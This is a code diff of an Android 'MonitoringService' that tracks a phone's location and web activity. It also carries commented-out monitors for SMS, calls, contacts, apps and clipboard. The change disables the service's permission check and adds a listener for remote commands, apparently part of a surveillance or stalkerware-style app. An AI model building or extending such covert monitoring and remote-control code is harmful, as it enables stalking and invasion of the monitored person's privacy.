@@ -19,6 +19,8 @@ import com.google.firebase.auth.FirebaseAuth;
 public class MonitoringService extends Service {
     private static final String TAG = "MonitoringService";
     private static final String CHANNEL_ID = "MonitoringServiceChannel";
+    private CommandListener commandListener; // CommandListener initialization
+
 
     @Nullable
     @Override
@@ -31,13 +33,13 @@ public class MonitoringService extends Service {
         Log.d(TAG, "Service started");
 
         // Check if required permissions and accessibility service are granted
-        if (!PermissionHelper.isForegroundServicePermissionGranted(this) ||
-                !PermissionHelper.isLocationPermissionGranted(this) ||
-                !PermissionHelper.areCorePermissionsGranted(this)) {
-            Log.e(TAG, "Required permissions or accessibility service not granted. Stopping service.");
-            showPermissionActivity(); // Start PermissionActivity to request permissions
-            return START_NOT_STICKY;
-        }
+//        if (!PermissionHelper.isForegroundServicePermissionGranted(this) ||
+//                !PermissionHelper.isLocationPermissionGranted(this) ||
+//                !PermissionHelper.areCorePermissionsGranted(this)) {
+//            Log.e(TAG, "Required permissions or accessibility service not granted. Stopping service.");
+//            showPermissionActivity(); // Start PermissionActivity to request permissions
+//            return START_NOT_STICKY;
+//        }
 
         createNotificationChannel();
 
@@ -82,15 +84,17 @@ public class MonitoringService extends Service {
             }
 
             // Start monitoring components
-            startSMSMonitor(userId, phoneModel);
-            startCallMonitor(userId, phoneModel);
+            //startSMSMonitor(userId, phoneModel);
+            //startCallMonitor(userId, phoneModel);
             startLocationMonitor(userId, phoneModel);
-            startMMSMonitor(userId, phoneModel);
-            startContactMonitor(userId, phoneModel);
-            startAppMonitor(userId, phoneModel);
+            //startMMSMonitor(userId, phoneModel);
+            //startContactMonitor(userId, phoneModel);
+            //startAppMonitor(userId, phoneModel);
             startWebMonitor(userId, phoneModel);
-            startAppUsageMonitor(userId, phoneModel);
-            startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
+            //startAppUsageMonitor(userId, phoneModel);
+            //startClipboardMonitor(userId, phoneModel); // Added Clipboard Monitor
+            initializeCommandListener(userId, phoneModel); // Initialize CommandListener
+
 
         } catch (Exception e) {
             Log.e(TAG, "Error starting monitors: " + e.getMessage());
@@ -157,6 +161,12 @@ public class MonitoringService extends Service {
         serviceIntent.putExtra("phoneModel", phoneModel);
 
         startService(serviceIntent);
+    }
+
+    private void initializeCommandListener(String userId, String phoneModel) {
+        Log.d(TAG, "Initializing Command Listener");
+        commandListener = new CommandListener(userId, phoneModel, this); // Pass the context
+        commandListener.startListeningForCommands(); // Start listening for commands
     }
 
     private void createNotificationChannel() {
